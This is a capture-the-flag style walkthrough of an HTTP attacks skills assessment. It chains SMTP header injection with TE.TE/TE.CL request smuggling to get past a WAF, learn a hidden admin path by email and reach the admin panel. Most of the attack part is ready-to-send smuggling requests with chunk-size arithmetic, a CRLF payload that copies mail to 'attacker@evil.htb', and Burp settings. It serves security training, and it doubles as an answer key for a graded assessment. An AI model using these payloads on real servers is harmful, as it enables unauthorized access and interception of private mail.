# 🎯 HTTP Attacks - Skills Assessment

## Scenario

**Company**: SentinelFrame Solutions

**Setup**:
- WAF deployed to block malicious requests
- Admin panel moved from `/admin` to **concealed path**
- Contact form for reaching system administrator
- Email testing account: `attacker@evil.htb` (accessible at `/mail`)

**Objective**: Combine multiple HTTP attack techniques to bypass security controls and obtain sensitive information.

---

## Attack Chain Overview

```
1. SMTP Header Injection → Discover hidden admin path
2. TE.CL via TE.TE      → Bypass WAF blocking CRLF
3. Request Smuggling    → Access hidden admin panel
```

---

## Phase 1: Reconnaissance

### Contact Form Discovery

1. Navigate to website root
2. Click **Contact** button
3. Observe form fields: name, email, message

### Initial Request

```http
POST /contact HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

name=Test&email=test@gmail.com&message=Hello
```

---

## Phase 2: SMTP Header Injection (Blocked)

### First Attempt

Try injecting CRLF to add `Cc:` header:

```http
name=Test&email=test%40gmail.com%0d%0aCc:attacker@evil.htb&message=Hello
```

### Result

**WAF blocks** requests containing CRLF characters (`%0d%0a`).

---

## Phase 3: Bypass WAF via TE.CL (TE.TE Substring)

### Vulnerability Type

**TE.CL via TE.TE** using **Substring match** technique.

The WAF/proxy accepts `Transfer-Encoding: asdchunked` (substring contains "chunked").

### Crafting the Payload

**Request 1** (Smuggling + SMTP Injection):

```http
GET /404 HTTP/1.1
Host: <TARGET>
Content-Length: 4
Transfer-Encoding: asdchunked

f3
POST /contact HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Content-Length: 114

name=Test%0d%0aCc:+attacker@evil.htb%0d%0aDoesNotExist:+True&email=test@gmail.com&message=Hello+Admin

0

```

### Key Points

| Element | Purpose |
|---------|---------|
| `Transfer-Encoding: asdchunked` | Substring bypass (TE.TE) |
| `Content-Length: 4` | For TE.CL (proxy uses TE, backend uses CL) |
| `f3` (hex) | Chunk size = 243 bytes |
| `Cc: attacker@evil.htb` | SMTP header injection |
| `DoesNotExist: True` | Absorbs appended data |
| `0` | Empty chunk terminator |

### Chunk Size Calculation

Count bytes from `POST /contact...` until before `0`:

```
POST /contact HTTP/1.1\r\n
Host: <TARGET>\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 114\r\n
\r\n
name=Test%0d%0aCc:+attacker@evil.htb%0d%0aDoesNotExist:+True&email=test@gmail.com&message=Hello+Admin\r\n
\r\n
```

Total: **243 bytes = 0xf3**

### Burp Configuration

1. **Uncheck** "Update Content-Length"
2. Send request

---

## Phase 4: Check Email

### Navigate to Inbox

```
http://<TARGET>/mail
```

### Expected Email

From admin, revealing:
- Hidden admin panel path: `/ksu3nsj9c`
- WAF blocks external access to admin

---

## Phase 5: Access Hidden Admin Panel

### Challenge

WAF blocks direct access to `/ksu3nsj9c`.

### Solution

Use same TE.CL technique to smuggle request to admin panel.

### Exploit Requests

**Request 1** (Smuggling):

```http
GET /404 HTTP/1.1
Host: <TARGET>
Content-Length: 4
Transfer-Encoding: asdchunked

38
GET /ksu3nsj9c HTTP/1.1
Host: <TARGET>

0

```

**Request 2** (Trigger):

```http
GET /404 HTTP/1.1
Host: <TARGET>
```

### Chunk Size

```
GET /ksu3nsj9c HTTP/1.1\r\n    = 26 bytes
Host: <TARGET>\r\n             = ~20 bytes
\r\n                           = 2 bytes
                               ──────────
                               ~56 bytes = 0x38
```

### Burp Configuration

1. **Uncheck** "Update Content-Length" for Request 1
2. Create **Tab Group** with both requests
3. Set **Send group in sequence (single connection)**
4. Send

---

## Expected Results

| Request | Expected Response |
|---------|-------------------|
| Request 1 (GET /404) | 404 Not Found |
| Request 2 (GET /404) | **Admin panel content!** |

Request 2 receives the response to the **smuggled** `/ksu3nsj9c` request.

---

## Attack Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK CHAIN                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. WAF blocks CRLF in direct requests                          │
│                    ↓                                             │
│  2. Use TE.TE (substring) to create TE.CL scenario              │
│                    ↓                                             │
│  3. Smuggle SMTP Header Injection past WAF                      │
│                    ↓                                             │
│  4. Receive email copy → Learn hidden admin path                │
│                    ↓                                             │
│  5. WAF blocks direct admin access                              │
│                    ↓                                             │
│  6. Smuggle GET request to hidden admin panel                   │
│                    ↓                                             │
│  7. Access admin content via second request's response          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Techniques Combined

| Technique | Module Section |
|-----------|----------------|
| **SMTP Header Injection** | CRLF Injection |
| **TE.TE Substring Match** | HTTP Request Smuggling |
| **TE.CL Request Smuggling** | HTTP Request Smuggling |
| **WAF Bypass** | Request Smuggling Exploitation |

---

## Key Takeaways

1. **Chain vulnerabilities** - Single vuln might not work, combine them
2. **WAF bypass via smuggling** - Hide payloads in request body
3. **TE.TE enables TE.CL** - Obfuscation creates exploitable scenario
4. **Email as data channel** - Use available functionality for recon
5. **Tab groups essential** - Single connection required for smuggling

---

## References

- [CRLF Injection](crlf-injection/introduction.md)
- [TE.CL Vulnerabilities](http-request-smuggling/te-cl.md)
- [TE.TE Obfuscation](http-request-smuggling/te-te.md)
- [SMTP Header Injection](crlf-injection/smtp-header-injection.md)

